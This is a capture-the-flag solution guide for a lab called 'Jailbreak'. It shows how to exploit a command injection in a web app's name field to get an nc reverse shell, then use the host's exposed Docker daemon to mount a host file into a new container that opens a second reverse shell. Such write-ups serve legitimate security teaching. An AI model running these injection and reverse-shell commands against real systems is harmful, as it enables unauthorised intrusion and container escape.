# Jailbreak

_Solution Guide_

## Overview

As instructed in the challenge guide, download the server source code from the challenge server and view the schema. Inspecting these two items reveals that the server creates and launches containers using Docker. The overarching objective in this challenge is to access resources on a Docker host from within a container by taking advantage of a vulnerable configuration.

## Question 1

_/app/flag1.txt (in container)_

In this section, we will first break out of the web app and get a shell to its hosting container. This will enable us to directly run a `docker` command in order to access host resources.

- (Info) Analyzing the source code will reveal a command injection vulnerability in `src/controllers/container.py` in the `create_user_container` method of the controller, which calls the `run_container` function in `src/dockercli.py` with a user's first and last name as a container name.
- Start a listen server with `nc -lvp 4444` in a terminal tab.
- Note local IP with `ip a` (we will use `10.5.5.50` for this example)
- Do a command injection by making a user with a name containing `; nc 10.5.5.50 4444;`, for example:
    - `curl --request POST --data '{"first_name": "Test", "last_name": "; nc 10.5.5.50 4444 -e /bin/sh;"}' http://10.5.5.10/users`
- Then follow it with `curl --request POST http://10.5.5.10/containers/<created_user_id>`
- (Info) This should make the web app container connect to the listen server with a reverse shell.
- Flag 1 is in `/app/flag1.txt`. Retrieve it with `cat /app/flag1.txt` in the reverse shell.
- Keep the reverse shell open for the next part.

## Question 2

_/root/flag2.txt (out of container)_

Now we're going to exploit the fact that the container is able to access the host's Docker daemon in order to mount data from the host into a new container using a custom `docker` command. While concocting the command for the new container, we also want to get a shell to it and so we will tell it to connect to a another local `nc` server when we create it.

- Start a listen server with 'nc -lvp 4445' in another terminal tab.
- (Info) The challenge says that the second flag is at `/root/flag2.txt` outside of the container. This means we need a way to access resources on the docker host by escaping containment.
- (Info) The source code plainly shows that the container has the docker command line tool, and we will use it.
- (Info) List the networks available to containers with `docker network ls`. The source code shows the name of the image used, but they can be listed with `docker images`.
- (Info) Mounting a volume to a running container is possible but unsupported. It would be much easier to start a new container with the file we need already mounted:
    - `docker run --name test --net c14-net -d -v /root/flag2.txt:/flag2.txt jailbreak-pc22 nc 10.5.5.50 4445 -e /bin/sh`
- Flag 2 is at /flag2.txt in the new reverse shell. Retrieve it with `cat /flag2.txt`.
